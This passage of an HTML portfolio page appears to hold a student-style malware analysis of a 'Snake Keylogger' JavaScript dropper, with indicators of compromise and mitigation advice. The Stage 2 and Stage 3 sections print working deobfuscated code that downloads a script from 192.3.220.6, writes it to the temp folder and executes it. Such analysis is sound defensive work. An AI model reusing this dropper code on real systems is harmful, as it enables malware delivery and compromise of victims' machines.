                <h2 class="text-3xl font-bold text-white">Mitigation & Response Strategies</h2>
            </div>
            
            <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
                <div class="space-y-6">
                    <div class="bg-gray-800/50 rounded-lg p-6">
                        <h4 class="text-green-400 font-semibold mb-3">Prevention Measures</h4>
                        <ul class="text-gray-300 text-sm space-y-2">
                            <li>• Avoid clicking suspicious links and attachments</li>
                            <li>• Implement comprehensive user security training</li>
                            <li>• Deploy advanced email filtering solutions</li>
                            <li>• Maintain updated antivirus and anti-malware</li>
                            <li>• Regular system and software updates</li>
                        </ul>
                    </div>
                    
                    <div class="bg-gray-800/50 rounded-lg p-6">
                        <h4 class="text-green-400 font-semibold mb-3">Detection Methods</h4>
                        <ul class="text-gray-300 text-sm space-y-2">
                            <li>• Network traffic anomaly monitoring</li>
                            <li>• Behavioral analysis of system processes</li>
                            <li>• DNS query pattern analysis</li>
                            <li>• Endpoint detection and response (EDR)</li>
                            <li>• Threat intelligence integration</li>
                        </ul>
                    </div>
                </div>
                
                <div class="bg-gray-800/50 rounded-lg p-6">
                    <h4 class="text-green-400 font-semibold mb-4">Incident Response Protocol</h4>
                    <div class="space-y-4">
                        <div class="flex items-start space-x-3">
                            <div class="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center text-white font-bold text-sm">1</div>
                            <div>
                                <h5 class="text-white font-semibold">Immediate Isolation</h5>
                                <p class="text-gray-300 text-sm">Disconnect infected systems from network</p>
                            </div>
                        </div>
                        <div class="flex items-start space-x-3">
                            <div class="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center text-white font-bold text-sm">2</div>
                            <div>
                                <h5 class="text-white font-semibold">Safe Mode Boot</h5>
                                <p class="text-gray-300 text-sm">Boot Windows in safe mode to prevent malware execution</p>
                            </div>
                        </div>
                        <div class="flex items-start space-x-3">
                            <div class="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center text-white font-bold text-sm">3</div>
                            <div>
                                <h5 class="text-white font-semibold">Offline Scanning</h5>
                                <p class="text-gray-300 text-sm">Run Windows Defender offline scan or boot rescue tools</p>
                            </div>
                        </div>
                        <div class="flex items-start space-x-3">
                            <div class="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center text-white font-bold text-sm">4</div>
                            <div>
                                <h5 class="text-white font-semibold">Professional Recovery</h5>
                                <p class="text-gray-300 text-sm">Use Hirens Boot CD or similar recovery tools for advanced cleaning</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Research References -->
        <div class="bg-gray-800/30 rounded-2xl p-8 border border-gray-600">
            <div class="flex items-center mb-6">
                <div class="w-12 h-12 bg-gradient-to-r from-gray-500 to-gray-700 rounded-full flex items-center justify-center mr-4">
                    <i class="fas fa-book text-white"></i>
                </div>
                <h2 class="text-2xl font-bold text-white">Research References & Sources</h2>
            </div>
            
            <div class="space-y-4 text-gray-300 text-sm">
                <div class="border-l-4 border-purple-500 pl-4">
                    <h4 class="text-purple-400 font-semibold mb-2">Threat Intelligence Sources</h4>
                    <ul class="space-y-1">
                        <li>• <strong>Malware Bazaar:</strong> Sample acquisition and threat intelligence</li>
                        <li>• <strong>URLScan.io:</strong> Infrastructure analysis and threat attribution</li>
                        <li>• <strong>AS198953 Analysis:</strong> Russian cybercriminal infrastructure investigation</li>
                    </ul>
                </div>
                
                <div class="border-l-4 border-blue-500 pl-4">
                    <h4 class="text-blue-400 font-semibold mb-2">Referenced Security Incidents</h4>
                    <ul class="space-y-1">
                        <li>• DUCKDNS infrastructure abuse: <a href="https://community.home-assistant.io/t/mydomain-duckdns-org-marked-as-dangerous-after-pasting-passwords/357812" class="text-blue-400 hover:underline" target="_blank">Home Assistant Community Report</a></li>
                        <li>• Cryptocurrency scam operations: <a href="https://urlscan.io/result/609a6264-c078-4af2-85d8-b5fc3ad6dad7/" class="text-blue-400 hover:underline" target="_blank">URLScan Analysis #1</a></li>
                        <li>• Criminal group evidence: <a href="https://urlscan.io/result/448651c1-7bea-4e29-a1c5-91605e199bb3" class="text-blue-400 hover:underline" target="_blank">URLScan Analysis #2</a></li>
                        <li>• AS198953 infrastructure mapping: <a href="https://urlscan.io/search/#page.asn:%22AS198953%22" class="text-blue-400 hover:underline" target="_blank">URLScan Search Results</a></li>
                    </ul>
                </div>
                
                <div class="border-l-4 border-green-500 pl-4">
                    <h4 class="text-green-400 font-semibold mb-2">Recovery Tools & Resources</h4>
                    <ul class="space-y-1">
                        <li>• <strong>Hiren's Boot CD:</strong> <a href="https://www.hirensbootcd.org/hbcd-v152/" class="text-green-400 hover:underline" target="_blank">Professional malware removal toolkit</a></li>
                        <li>• <strong>Windows Defender Offline:</strong> Microsoft's offline scanning solution</li>
                        <li>• <strong>VMware Workstation Pro:</strong> Secure analysis environment</li>
                    </ul>
                </div>
            </div>
        </div>
    </section>    <!-- SNAKE KEYLOGGER ANALYSIS SECTION -->
    <section id="snake-keylogger" class="section-content">
        <div class="mb-8">
            <button onclick="showOverview()" class="back-btn px-6 py-3 rounded-lg text-white font-semibold flex items-center space-x-2 hover:bg-gray-600">
                <i class="fas fa-arrow-left"></i>
                <span>Back to Overview</span>
            </button>
        </div>        <div class="text-center mb-16">
            <h1 class="text-4xl md:text-6xl font-black mb-6">
                <span class="bg-gradient-to-r from-red-400 via-orange-400 to-yellow-400 bg-clip-text text-transparent">
                    SNAKE KEYLOGGER
                </span>
            </h1>
            <p class="text-xl text-gray-300 max-w-3xl mx-auto leading-relaxed mb-8">
                Real-world malware analysis of Snake Keylogger - Professional reverse engineering and code deobfuscation.
            </p>
        </div>

        <!-- Digital Crime Scene Investigation Entry -->
        <div class="bg-gradient-to-r from-red-900/30 via-orange-900/20 to-yellow-900/30 backdrop-blur-sm rounded-2xl p-8 border border-red-500/40 mb-16 relative overflow-hidden">
            <!-- Animated Background Elements -->
            <div class="absolute inset-0 opacity-10">
                <div class="absolute top-4 left-4 w-2 h-2 bg-red-500 rounded-full animate-pulse"></div>
                <div class="absolute top-8 right-8 w-1 h-1 bg-orange-400 rounded-full animate-ping"></div>
                <div class="absolute bottom-6 left-12 w-1.5 h-1.5 bg-yellow-500 rounded-full animate-pulse"></div>
            </div>
            
            <div class="relative z-10">
                <div class="flex items-center justify-center mb-8">
                    <div class="w-20 h-20 bg-gradient-to-r from-red-500 to-orange-500 rounded-full flex items-center justify-center mr-6 animate-pulse">
                        <i class="fas fa-binoculars text-white text-2xl"></i>
                    </div>
                    <div class="text-center">
                        <h2 class="text-3xl font-bold text-white mb-2">🔍 DIGITAL CRIME SCENE INVESTIGATION</h2>
                        <p class="text-red-200 font-semibold">INCIDENT ID: SKL-2024-0837 | CLASSIFICATION: CONFIDENTIAL</p>
                    </div>
                </div>

                <div class="bg-black/40 rounded-xl p-6 border border-red-500/30 mb-6">
                    <div class="flex items-center mb-4">
                        <div class="w-3 h-3 bg-red-500 rounded-full mr-3 animate-pulse"></div>
                        <span class="text-red-400 font-mono text-sm">EVIDENCE BRIEFING IN PROGRESS...</span>
                    </div>
                    
                    <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
                        <div class="space-y-4">
                            <div class="border-l-4 border-red-500 pl-4">
                                <h4 class="text-red-300 font-bold mb-2">⚠️ THREAT ASSESSMENT</h4>
                                <p class="text-gray-300 text-sm leading-relaxed">
                                    You are about to examine a <strong class="text-red-400">live malware specimen</strong> recovered from 
                                    a recent cyber incident. This JavaScript-based keylogger has been <strong class="text-orange-400">
                                    heavily obfuscated</strong> to evade detection and contains sophisticated anti-analysis mechanisms.
                                </p>
                            </div>
                            
                            <div class="bg-gray-800/50 rounded-lg p-4">
                                <h5 class="text-orange-400 font-semibold mb-3">🎯 Investigation Objectives</h5>
                                <ul class="text-gray-300 text-sm space-y-1">
                                    <li>• Decode obfuscated payload structure</li>
                                    <li>• Identify command & control mechanisms</li>
                                    <li>• Map data exfiltration pathways</li>
                                    <li>• Document evasion techniques</li>
                                </ul>
                            </div>
                        </div>
                        
                        <div class="space-y-4">
                            <div class="border-l-4 border-yellow-500 pl-4">
                                <h4 class="text-yellow-300 font-bold mb-2">🔬 ANALYSIS METHODOLOGY</h4>
                                <p class="text-gray-300 text-sm leading-relaxed">
                                    Our investigation employs <strong class="text-yellow-400">controlled deobfuscation</strong> techniques, 
                                    static code analysis, and behavioral monitoring within an isolated environment to 
                                    <strong class="text-orange-400">reverse-engineer</strong> the malware's true capabilities.
                                </p>
                            </div>
                            
                            <div class="bg-gradient-to-r from-red-900/30 to-orange-900/30 rounded-lg p-4 border border-red-500/20">
                                <h5 class="text-red-300 font-semibold mb-3">🚨 Security Clearance Required</h5>
                                <div class="flex items-center space-x-3">
                                    <div class="flex space-x-1">
                                        <div class="w-2 h-2 bg-green-500 rounded-full"></div>
                                        <div class="w-2 h-2 bg-green-500 rounded-full"></div>
                                        <div class="w-2 h-2 bg-green-500 rounded-full"></div>
                                    </div>
                                    <span class="text-green-400 text-sm font-mono">ACCESS GRANTED</span>
                                </div>
                                <p class="text-gray-400 text-xs mt-2">Isolated analysis environment active</p>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Interactive Evidence Timeline -->
                <div class="bg-gray-900/60 rounded-xl p-6 border border-orange-500/30">
                    <h3 class="text-xl font-bold text-orange-400 mb-6 text-center">📋 EVIDENCE ANALYSIS TIMELINE</h3>
                    <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
                        <div class="bg-red-900/40 rounded-lg p-4 border border-red-500/30 text-center">
                            <div class="w-12 h-12 bg-red-500 rounded-full flex items-center justify-center mx-auto mb-3">
                                <span class="text-white font-bold">1</span>
                            </div>
                            <h4 class="text-red-300 font-semibold mb-2">INITIAL CAPTURE</h4>
                            <p class="text-gray-400 text-xs">Malware specimen acquired</p>
                        </div>
                        
                        <div class="bg-orange-900/40 rounded-lg p-4 border border-orange-500/30 text-center">
                            <div class="w-12 h-12 bg-orange-500 rounded-full flex items-center justify-center mx-auto mb-3">
                                <span class="text-white font-bold">2</span>
                            </div>
                            <h4 class="text-orange-300 font-semibold mb-2">DEOBFUSCATION</h4>
                            <p class="text-gray-400 text-xs">Code layers revealed</p>
                        </div>
                        
                        <div class="bg-yellow-900/40 rounded-lg p-4 border border-yellow-500/30 text-center">
                            <div class="w-12 h-12 bg-yellow-500 rounded-full flex items-center justify-center mx-auto mb-3">
                                <span class="text-white font-bold">3</span>
                            </div>
                            <h4 class="text-yellow-300 font-semibold mb-2">BEHAVIOR ANALYSIS</h4>
                            <p class="text-gray-400 text-xs">Capabilities mapped</p>
                        </div>
                        
                        <div class="bg-green-900/40 rounded-lg p-4 border border-green-500/30 text-center">
                            <div class="w-12 h-12 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-3">
                                <span class="text-white font-bold">4</span>
                            </div>
                            <h4 class="text-green-300 font-semibold mb-2">COUNTERMEASURES</h4>
                            <p class="text-gray-400 text-xs">Defenses documented</p>
                        </div>
                    </div>
                </div>

                <!-- Warning Banner -->
                <div class="mt-6 bg-red-950/50 border border-red-500 rounded-lg p-4">
                    <div class="flex items-center space-x-3">
                        <i class="fas fa-exclamation-triangle text-red-400 text-xl"></i>
                        <div>
                            <h4 class="text-red-300 font-bold">CAUTION: LIVE MALWARE ANALYSIS</h4>
                            <p class="text-gray-400 text-sm">
                                The following investigation contains actual malicious code samples. 
                                All analysis was conducted in a secure, isolated environment.
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Executive Summary -->
        <div class="bg-gradient-to-r from-red-900/20 to-orange-900/20 backdrop-blur-sm rounded-2xl p-8 border border-red-500/30 mb-16">
            <div class="flex items-center mb-6">
                <div class="w-16 h-16 bg-gradient-to-r from-red-500 to-orange-500 rounded-full flex items-center justify-center mr-6">
                    <i class="fas fa-exclamation-triangle text-white text-xl"></i>
                </div>
                <div>
                    <h2 class="text-3xl font-bold text-white mb-2">Executive Summary</h2>
                    <p class="text-red-200">Critical Threat Assessment</p>
                </div>
            </div>
            <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
                <div>
                    <h3 class="text-xl font-bold text-red-300 mb-4">Malware Classification</h3>
                    <ul class="space-y-2 text-gray-300">
                        <li><strong class="text-red-400">Type:</strong> JavaScript Dropper & Keylogger</li>
                        <li><strong class="text-red-400">Threat Level:</strong> High</li>
                        <li><strong class="text-red-400">Target Platform:</strong> Windows (Internet Explorer/ActiveX)</li>
                        <li><strong class="text-red-400">Distribution:</strong> Email attachments, malicious websites</li>
                    </ul>
                </div>
                <div>
                    <h3 class="text-xl font-bold text-orange-300 mb-4">Key Findings</h3>
                    <ul class="space-y-2 text-gray-300">
                        <li><strong class="text-orange-400">Obfuscation:</strong> Heavy String.fromCharCode() encoding</li>
                        <li><strong class="text-orange-400">Persistence:</strong> System directory file placement</li>
                        <li><strong class="text-orange-400">C&C Communication:</strong> HTTP-based data exfiltration</li>
                        <li><strong class="text-orange-400">Evasion:</strong> ActiveX exploitation, DOM manipulation</li>
                    </ul>
                </div>
            </div>
        </div>

        <!-- Analysis Process Screenshots -->
        <div class="bg-white/5 backdrop-blur-sm rounded-2xl p-8 border border-blue-500/20 mb-16">
            <h2 class="text-3xl font-bold text-white mb-8 text-center">Analysis Process & Screenshots</h2>
            <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
                <!-- Initial Code Analysis -->
                <div class="bg-gray-800/50 rounded-xl p-6 border border-blue-500/30">
                    <div class="mb-4">
                        <img src="{{ asset('images/snake_keylogger/s1.png') }}" alt="Initial Snake Keylogger Code Analysis" class="w-full rounded-lg border border-gray-600 mb-4">
                    </div>
                    <h3 class="text-xl font-bold text-blue-400 mb-3">1. Initial Code Analysis</h3>
                    <p class="text-gray-300 text-sm leading-relaxed">
                        First encounter with the heavily obfuscated JavaScript code showing the characteristic 
                        String.fromCharCode() pattern used to hide malicious strings and function calls.
                    </p>
                </div>

                <!-- Deobfuscation Process -->
                <div class="bg-gray-800/50 rounded-xl p-6 border border-purple-500/30">
                    <div class="mb-4">
                        <img src="{{ asset('images/snake_keylogger/s2.png') }}" alt="Snake Keylogger Deobfuscation Process" class="w-full rounded-lg border border-gray-600 mb-4">
                    </div>
                    <h3 class="text-xl font-bold text-purple-400 mb-3">2. Deobfuscation Process</h3>
                    <p class="text-gray-300 text-sm leading-relaxed">
                        Systematic conversion of character codes to reveal the true functionality, 
                        exposing ActiveX object creation and system manipulation techniques.
                    </p>
                </div>

                <!-- Function Translation -->
                <div class="bg-gray-800/50 rounded-xl p-6 border border-green-500/30">
                    <div class="mb-4">
                        <img src="{{ asset('images/snake_keylogger/s3.png') }}" alt="Snake Keylogger Function Translation" class="w-full rounded-lg border border-gray-600 mb-4">
                    </div>
                    <h3 class="text-xl font-bold text-green-400 mb-3">3. Function Translation</h3>
                    <p class="text-gray-300 text-sm leading-relaxed">
                        Complete translation of obfuscated functions revealing Base64 decoding mechanisms 
                        and XML DOM manipulation for payload delivery and execution.
                    </p>
                </div>

                <!-- Final Analysis -->
                <div class="bg-gray-800/50 rounded-xl p-6 border border-red-500/30">
                    <div class="mb-4">
                        <img src="{{ asset('images/snake_keylogger/s4.png') }}" alt="Snake Keylogger Final Analysis" class="w-full rounded-lg border border-gray-600 mb-4">
                    </div>
                    <h3 class="text-xl font-bold text-red-400 mb-3">4. Final Analysis</h3>
                    <p class="text-gray-300 text-sm leading-relaxed">
                        Complete malware behavior analysis showing file system manipulation, 
                        network communication patterns, and system persistence mechanisms.
                    </p>
                </div>
            </div>
        </div>

        <!-- Code Analysis Sections -->
        <div class="space-y-12">
            <!-- Stage 1: Initial Obfuscated Code -->
            <div class="bg-white/5 backdrop-blur-sm rounded-2xl p-8 border border-red-500/20">
                <h2 class="text-2xl font-bold text-red-400 mb-6">Stage 1: Initial Obfuscated Payload</h2>
                <div class="bg-gray-900/80 rounded-lg p-6 border border-gray-700 mb-6">
                    <pre class="text-sm text-green-400 font-mono overflow-x-auto"><code>var I0i=64562877
var LEZVCW = String.fromCharCode(64562993-I0i,64562991-I0i,64562998-I0i,64563000-I0i,64562887-I0i,64562995-I0i,64562974-I0i,64562991-I0i,64562909-I0i,64562956-I0i,64562975-I0i,64562983-I0i,64562978-I0i,64562976-I0i,64562993-I0i,64562909-I0i,64562938-I0i,64562909-I0i,64562987-I0i,64562978-I0i,64562996-I0i,64562909-I0i,64562942-I0i,64562976-I0i,64562993-I0i,64562982-I0i,64562995-I0i,64562978-I0i,64562965-I0i,64562956-I0i,64562975-I0i,64562983-I0i,64562978-I0i,64562976-I0i,64562993-I0i,64562917-I0i,64562911-I0i,64562954-I0i...)
eval(LEZVCW)</code></pre>
                </div>
                <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
                    <div>
                        <h3 class="text-lg font-bold text-white mb-3">Obfuscation Analysis</h3>
                        <ul class="space-y-2 text-gray-300 text-sm">
                            <li><strong class="text-red-400">Technique:</strong> Arithmetic-based character encoding</li>
                            <li><strong class="text-red-400">Pattern:</strong> Large integer subtraction (64562993-64562877 = 116 = 't')</li>
                            <li><strong class="text-red-400">Purpose:</strong> Hide malicious code from static analysis</li>
                            <li><strong class="text-red-400">Execution:</strong> Dynamic evaluation via eval()</li>
                        </ul>
                    </div>
                    <div>
                        <h3 class="text-lg font-bold text-white mb-3">Threat Indicators</h3>
                        <ul class="space-y-2 text-gray-300 text-sm">
                            <li><strong class="text-orange-400">🚨</strong> Heavy obfuscation present</li>
                            <li><strong class="text-orange-400">🚨</strong> Dynamic code execution</li>
                            <li><strong class="text-orange-400">🚨</strong> Evasion techniques detected</li>
                            <li><strong class="text-orange-400">🚨</strong> Potential malware dropper</li>
                        </ul>
                    </div>
                </div>
            </div>

            <!-- Stage 2: Deobfuscated Code -->
            <div class="bg-white/5 backdrop-blur-sm rounded-2xl p-8 border border-orange-500/20">
                <h2 class="text-2xl font-bold text-orange-400 mb-6">Stage 2: Deobfuscated Malware Code</h2>
                <div class="bg-gray-900/80 rounded-lg p-6 border border-gray-700 mb-6">
                    <pre class="text-sm text-cyan-400 font-mono overflow-x-auto"><code>try {
    var Object = new ActiveXObject("MSXML2.XMLHTTP");
    Object.Open("GET", "http://192.3.220.6/web/w88.js", false);
    Object.Send();
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var filepath = fso.GetSpecialFolder(2) + "/OPXCFY.js";
    if (Object.Status == 200) {
        var Stream = new ActiveXObject("ADODB.Stream");
        Stream.Open();
        Stream.Type = 1;
        Stream.Write(Object.ResponseBody);
        Stream.Position = 0;
        Stream.SaveToFile(filepath, 2);
        Stream.Close();
        var WshShell = new ActiveXObject("WScript.Shell");
        var oRUN = WshShell.Run(filepath);
    }
} catch (e) {}</code></pre>
                </div>
                <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
                    <div>
                        <h3 class="text-lg font-bold text-white mb-3">Malicious Behavior</h3>
                        <ul class="space-y-2 text-gray-300 text-sm">
                            <li><strong class="text-orange-400">HTTP Request:</strong> Downloads payload from 192.3.220.6</li>
                            <li><strong class="text-orange-400">File System:</strong> Writes to system temp directory</li>
                            <li><strong class="text-orange-400">Execution:</strong> Runs downloaded payload automatically</li>
                            <li><strong class="text-orange-400">Stealth:</strong> Uses legitimate Windows objects</li>
                        </ul>
                    </div>
                    <div>
                        <h3 class="text-lg font-bold text-white mb-3">IOCs Identified</h3>
                        <ul class="space-y-2 text-gray-300 text-sm">
                            <li><strong class="text-red-400">IP:</strong> 192.3.220.6</li>
                            <li><strong class="text-red-400">URL:</strong> /web/w88.js</li>
                            <li><strong class="text-red-400">File:</strong> OPXCFY.js</li>
                            <li><strong class="text-red-400">Location:</strong> %TEMP% directory</li>
                        </ul>
                    </div>
                </div>
            </div>

            <!-- Stage 3: Advanced Obfuscation Analysis -->
            <div class="bg-white/5 backdrop-blur-sm rounded-2xl p-8 border border-purple-500/20">
                <h2 class="text-2xl font-bold text-purple-400 mb-6">Stage 3: Advanced Function Analysis</h2>
                <div class="space-y-6">
                    <!-- Base64 Decoder Function -->
                    <div>
                        <h3 class="text-lg font-bold text-white mb-3">Base64 Decoder Function</h3>
                        <div class="bg-gray-900/80 rounded-lg p-4 border border-gray-700">
                            <pre class="text-sm text-green-400 font-mono overflow-x-auto"><code>function processData(inputText) {
    // Creates XML Document Object for Base64 decoding
    const xmlDoc = new ActiveXObject("Msxml2.DOMDocument");
    const element = xmlDoc.createElement("temp");
    
    // Set dataType to Base64 for automatic decoding
    element.dataType = "bin.base64";
    element.text = inputText;
    
    // Return decoded binary data
    return element.nodeTypedValue;
}</code></pre>
                        </div>
                    </div>

                    <!-- File System Manipulation -->
                    <div>
                        <h3 class="text-lg font-bold text-white mb-3">File System Manipulation</h3>
                        <div class="bg-gray-900/80 rounded-lg p-4 border border-gray-700">
                            <pre class="text-sm text-yellow-400 font-mono overflow-x-auto"><code>// Creates persistent file in Windows system directory
var targetPath = new ActiveXObject("WScript.Shell").GetSpecialFolder(2) + "\\WindowsAudio.js";

// ADODB Stream for binary file operations
var stream = new ActiveXObject("ADODB.Stream");
stream.Open();
stream.Type = 1; // Binary mode
stream.Write(decodedPayload);
stream.SaveToFile(targetPath, 2); // Overwrite if exists
stream.Close();

// Execute the dropped file
new ActiveXObject("WScript.Shell").Run(targetPath);</code></pre>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Security Assessment -->
            <div class="bg-white/5 backdrop-blur-sm rounded-2xl p-8 border border-green-500/20">
                <h2 class="text-2xl font-bold text-green-400 mb-6">Security Assessment & Mitigation</h2>
                <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
                    <div class="bg-red-900/20 rounded-lg p-6 border border-red-500/30">
                        <h3 class="text-lg font-bold text-red-400 mb-4">Attack Vectors</h3>
                        <ul class="space-y-2 text-gray-300 text-sm">
                            <li>• Email attachments (.js, .jse files)</li>
                            <li>• Malicious websites with ActiveX</li>
                            <li>• Social engineering campaigns</li>
                            <li>• Drive-by downloads</li>
                            <li>• USB/removable media</li>
                        </ul>
                    </div>
                    <div class="bg-orange-900/20 rounded-lg p-6 border border-orange-500/30">
                        <h3 class="text-lg font-bold text-orange-400 mb-4">Detection Methods</h3>
                        <ul class="space-y-2 text-gray-300 text-sm">
                            <li>• Behavior-based analysis</li>
                            <li>• Network traffic monitoring</li>
                            <li>• File system integrity checks</li>
                            <li>• Process monitoring</li>
                            <li>• Memory forensics</li>
                        </ul>
                    </div>
                    <div class="bg-green-900/20 rounded-lg p-6 border border-green-500/30">
                        <h3 class="text-lg font-bold text-green-400 mb-4">Mitigation Strategies</h3>
                        <ul class="space-y-2 text-gray-300 text-sm">
                            <li>• Disable ActiveX controls</li>
                            <li>• Application whitelisting</li>
                            <li>• Network segmentation</li>
                            <li>• User education programs</li>
                            <li>• Regular security updates</li>
                        </ul>
                    </div>
                </div>
            </div>

            <!-- Technical Summary -->
            <div class="bg-gradient-to-r from-gray-900/50 to-slate-900/50 backdrop-blur-sm rounded-2xl p-8 border border-gray-500/20">
                <h2 class="text-2xl font-bold text-white mb-6 text-center">Technical Analysis Summary</h2>
                <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
                    <div>
                        <h3 class="text-xl font-bold text-cyan-400 mb-4">Malware Capabilities</h3>
                        <div class="space-y-3">
                            <div class="flex items-start">
                                <i class="fas fa-download text-red-400 mt-1 mr-3"></i>
                                <div>
                                    <strong class="text-white">Payload Download:</strong>
                                    <p class="text-gray-300 text-sm">Fetches additional malware from remote C&C server</p>
                                </div>
                            </div>
                            <div class="flex items-start">
                                <i class="fas fa-save text-orange-400 mt-1 mr-3"></i>
                                <div>
                                    <strong class="text-white">File Persistence:</strong>
                                    <p class="text-gray-300 text-sm">Creates persistent files in system directories</p>
                                </div>
                            </div>
                            <div class="flex items-start">
                                <i class="fas fa-eye-slash text-purple-400 mt-1 mr-3"></i>
                                <div>
                                    <strong class="text-white">Stealth Operations:</strong>
                                    <p class="text-gray-300 text-sm">Heavy obfuscation and legitimate API abuse</p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div>
                        <h3 class="text-xl font-bold text-yellow-400 mb-4">Forensic Artifacts</h3>
                        <div class="space-y-3">
                            <div class="flex items-start">
                                <i class="fas fa-network-wired text-blue-400 mt-1 mr-3"></i>
                                <div>
                                    <strong class="text-white">Network Activity:</strong>
                                    <p class="text-gray-300 text-sm">HTTP requests to 192.3.220.6:80</p>
                                </div>
                            </div>
                            <div class="flex items-start">
                                <i class="fas fa-folder text-green-400 mt-1 mr-3"></i>
                                <div>
                                    <strong class="text-white">File System:</strong>
                                    <p class="text-gray-300 text-sm">Dropped files in %TEMP% and system directories</p>
                                </div>
                            </div>
                            <div class="flex items-start">
                                <i class="fas fa-cogs text-pink-400 mt-1 mr-3"></i>
                                <div>
                                    <strong class="text-white">Process Activity:</strong>
                                    <p class="text-gray-300 text-sm">ActiveX object instantiation and script execution</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>    <!-- NEXUS FLOWCHART SECTION -->
    <section id="nexus-flowchart" class="section-content">
        <div class="mb-8">
            <button onclick="showOverview()" class="back-btn px-6 py-3 rounded-lg text-white font-semibold flex items-center space-x-2 hover:bg-gray-600">
                <i class="fas fa-arrow-left"></i>
                <span>Back to Overview</span>
            </button>
        </div>

        <!-- Futuristic Header with Dynamic Background -->
        <div class="text-center mb-16 relative overflow-hidden">
            <!-- Animated Background Particles -->
            <div class="absolute inset-0 opacity-20">
                <div class="particle-system">
                    <div class="particle particle-1"></div>
                    <div class="particle particle-2"></div>
                    <div class="particle particle-3"></div>
                    <div class="particle particle-4"></div>
                    <div class="particle particle-5"></div>
                </div>
            </div>
            
            <div class="relative z-10">
                <h1 class="text-4xl md:text-7xl font-black mb-6 relative">
                    <span class="bg-gradient-to-r from-emerald-400 via-cyan-400 to-blue-400 bg-clip-text text-transparent animate-pulse">
                        NEXUS FLOWCHART
                    </span>
                    <div class="absolute -inset-1 bg-gradient-to-r from-emerald-600 to-cyan-600 rounded-lg blur opacity-25 group-hover:opacity-75 transition duration-1000"></div>
                </h1>
                <div class="inline-block relative">
                    <p class="text-xl text-gray-300 max-w-4xl mx-auto leading-relaxed mb-8 relative z-10">
                        🚀 <strong class="text-emerald-400">Interactive Neural Network</strong> visualization of the complete NEXUS project ecosystem
                    </p>
                    <div class="absolute inset-0 bg-gradient-to-r from-transparent via-emerald-500/10 to-transparent blur-xl"></div>
                </div>
                
                <!-- Control Panel -->
                <div class="flex justify-center space-x-4 mb-8">
                    <button onclick="activateFlowchartMode('neural')" class="flowchart-mode-btn bg-emerald-600/20 hover:bg-emerald-600/40 text-emerald-400 px-4 py-2 rounded-lg border border-emerald-500/30 transition-all duration-300">
                        <i class="fas fa-brain mr-2"></i>Neural View
                    </button>
                    <button onclick="activateFlowchartMode('timeline')" class="flowchart-mode-btn bg-cyan-600/20 hover:bg-cyan-600/40 text-cyan-400 px-4 py-2 rounded-lg border border-cyan-500/30 transition-all duration-300">
                        <i class="fas fa-clock mr-2"></i>Timeline View
                    </button>
                    <button onclick="activateFlowchartMode('architecture')" class="flowchart-mode-btn bg-purple-600/20 hover:bg-purple-600/40 text-purple-400 px-4 py-2 rounded-lg border border-purple-500/30 transition-all duration-300">
                        <i class="fas fa-sitemap mr-2"></i>Architecture View
                    </button>
                </div>
            </div>
        </div>

        <!-- NEXUS Neural Network Visualization -->
        <div id="neural-flowchart" class="flowchart-mode bg-gradient-to-br from-emerald-900/30 via-cyan-900/20 to-blue-900/30 backdrop-blur-sm rounded-3xl p-12 border border-emerald-500/40 mb-16 relative overflow-hidden">
            <!-- Network Grid Background -->
            <div class="absolute inset-0 opacity-10">
                <div class="neural-grid"></div>
            </div>
            
            <div class="relative z-10">
                <h2 class="text-4xl font-bold text-center mb-12">
                    <span class="bg-gradient-to-r from-emerald-400 to-cyan-400 bg-clip-text text-transparent">
                        🧠 NEXUS Neural Architecture
                    </span>
                </h2>

                <!-- Central Hub -->
                <div class="flex justify-center mb-16">
                    <div class="nexus-core relative">
                        <div class="w-40 h-40 bg-gradient-to-r from-emerald-500 via-cyan-500 to-blue-500 rounded-full flex items-center justify-center relative animate-pulse-glow">
                            <div class="w-32 h-32 bg-gray-900 rounded-full flex items-center justify-center relative">
                                <i class="fas fa-atom text-4xl text-emerald-400 animate-spin-slow"></i>
                                <div class="absolute inset-0 border-2 border-dashed border-cyan-400/50 rounded-full animate-reverse-spin"></div>
                            </div>
                            <!-- Orbital Rings -->
                            <div class="absolute inset-0 border-2 border-emerald-400/30 rounded-full animate-pulse"></div>
                            <div class="absolute inset-2 border border-cyan-400/20 rounded-full animate-pulse" style="animation-delay: 0.5s"></div>
                        </div>
                        
                        <!-- Central Label -->
                        <div class="absolute -bottom-12 left-1/2 transform -translate-x-1/2 text-center">
                            <h3 class="text-xl font-bold text-emerald-400">NEXUS CORE</h3>
                            <p class="text-sm text-gray-400">Central Processing Hub</p>
                        </div>
                    </div>
                </div>

                <!-- Neural Connections Grid -->
                <div class="grid grid-cols-1 lg:grid-cols-3 gap-12 relative">
                    <!-- First Semester Neural Node -->
                    <div class="neural-node group relative">
                        <div class="connection-line connection-to-center"></div>
                        <div class="bg-gradient-to-br from-blue-900/50 to-cyan-900/50 backdrop-blur-sm rounded-2xl p-8 border border-blue-500/40 relative overflow-hidden hover:border-blue-400/80 transition-all duration-500 transform hover:scale-105">
                            <!-- Flowing Data Streams -->
                            <div class="absolute inset-0 opacity-20">
                                <div class="data-stream stream-1"></div>
                                <div class="data-stream stream-2"></div>
                                <div class="data-stream stream-3"></div>
                            </div>
                            
                            <div class="relative z-10">
                                <div class="flex items-center justify-center mb-6">
                                    <div class="w-20 h-20 bg-gradient-to-r from-blue-500 to-cyan-500 rounded-full flex items-center justify-center relative">
                                        <i class="fas fa-shield-alt text-white text-2xl"></i>
